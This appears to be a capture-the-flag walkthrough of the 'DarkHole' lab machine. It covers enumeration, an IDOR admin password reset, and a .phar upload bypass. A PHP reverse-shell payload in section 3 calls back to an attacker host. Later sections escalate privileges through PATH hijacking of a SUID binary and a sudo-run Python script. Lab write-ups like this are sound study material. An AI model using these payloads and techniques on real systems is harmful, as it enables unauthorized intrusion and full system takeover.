
---
tags
	#IDOR
	#file_upload
	#path_hijack
---

## 1. Enumeration

### Nmap Scan
First, we start with an Nmap scan to identify open ports and services.

```bash
nmap -sC -sV -Pn 192.168.52.131

Starting Nmap 7.92 ( https://nmap.org ) at 2026-03-24 08:15 -0500
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: DarkHole
```

### Directory Brute Forcing
Using Gobuster to find hidden directories.

```bash
gobuster dir -u http://192.168.52.131 -w /home/kali/CyberSec/SecLists/Discovery/Web-Content/common.txt

/upload               (Status: 301) [Size: 317] [--> http://192.168.52.131/upload/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.52.131/css/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.52.131/js/]
/config               (Status: 301) [Size: 317] [--> http://192.168.52.131/config/]
```

---

## 2. Web Exploitation (IDOR to Admin)

After creating a regular user account and logging in, I noticed that the URL for the profile or password change page included an `id` parameter (e.g., `id=2`).

### Identifying IDOR
1. I guessed that `id=1` would correspond to the admin user.
2. I attempted to change my own password but intercepted the request using **Burp Suite**.
3. By changing the `id` parameter from `2` to `1` in the POST request body, successfully reset the administrator's password.

**New Admin Credentials:**
*   **Username:** `admin`
*   **Password:** `hcxxx1` (The password I set via the IDOR vulnerability)

---

## 3. Initial Access (File Upload Bypass)

Once logged in as admin, there was a file upload feature.

1.  **Initial Attempt:** Uploading a `.php` reverse shell was blocked by the WAF, it only accepted `.jpg`, `.gif`, `.png`, so use BrupSuite to intercept the upload request and changed the extension.
2.  **Bypass:** I tried different PHP extensions and found that `.phar` was not blacklisted by the back-end.
3.  **Payload:** I uploaded `rce.jpg` containing a bash reverse shell.

```php
<?php passthru("bash -c 'bash -i >& /dev/tcp/192.168.52.128/4444 0>&1'"); ?>
```

After triggering the file via `http://192.168.52.131/upload/rce.phar`, I obtained a shell as `www-data`.

---

## 4. Privilege Escalation (User: john)

Exploring the home directory of user `john`, I found a SUID binary named `toto`.

```bash
www-data@darkhole:/home/john$ ls -la
-rwsr-xr-x 1 root root     16784 Jul 17  2021 toto
```

### Path Hijacking
Running `strings` on the `toto` binary revealed that it executes the `id` command without specifying an absolute path.

```bash
www-data@darkhole:/home/john$ strings toto 
setuid
system
id

...

```

I exploited this using **PATH Hijacking**:

```bash
cd /tmp
echo "/bin/bash" > id
chmod +x id
export PATH=/tmp:$PATH
/home/john/toto
```

This spawned a shell as the user `john`.

---

## 5. Privilege Escalation (User: root)

In `john`'s home directory, cat `password` file containing `root123`.

Checking sudo permissions:
```bash
john@darkhole:~$ sudo -l
User john may run the following commands on darkhole:
    (root) /usr/bin/python3 /home/john/file.py
```

Modified `/home/john/file.py` to spawn a root shell:

```python
import os
os.system("/bin/bash")
```

While this is better:

```python
import pty
pty.spawn("/bin/bash")
```

Finally, I executed the script with sudo to gain root access:

```bash
john@darkhole:~$ sudo /usr/bin/python3 /home/john/file.py
root@darkhole:/# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## Additional Concepts

### IDOR (Insecure Direct Object Reference)
IDOR occurs when an application provides direct access to objects based on user-supplied input. In this case, the `id` parameter allowed us to manipulate the account details of another user (the admin) because the server-side code failed to validate if the authenticated user had permission to modify the object requested by the `id`.

### PATH Hijacking
When a program calls an external executable (like `id`, `ls`, `cat`) without using its full path (e.g., `/usr/bin/id`), the system searches through the directories listed in the `PATH` environment variable. By placing a malicious executable with the same name in a directory we control and adding that directory to the beginning of the `PATH`, we can trick the SUID program into running our code with elevated privileges.
